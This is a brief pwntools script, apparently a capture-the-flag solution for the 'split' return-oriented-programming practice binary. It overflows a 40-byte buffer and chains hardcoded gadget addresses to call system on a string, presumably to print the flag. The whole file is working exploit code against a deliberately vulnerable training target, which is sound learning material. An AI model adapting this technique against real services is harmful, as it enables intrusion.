from pwn import *

pr = process("./split")

payload = b"A"*40
systemCall = p64(0x40074b)
cat = p64(0x601065)
pop_rdi = p64(0x4007c3)
ret = p64(0x40053e)

payload += systemCall + ret + pop_rdi + cat + systemCall

pr.sendline(payload)

print(pr.recvall().decode())
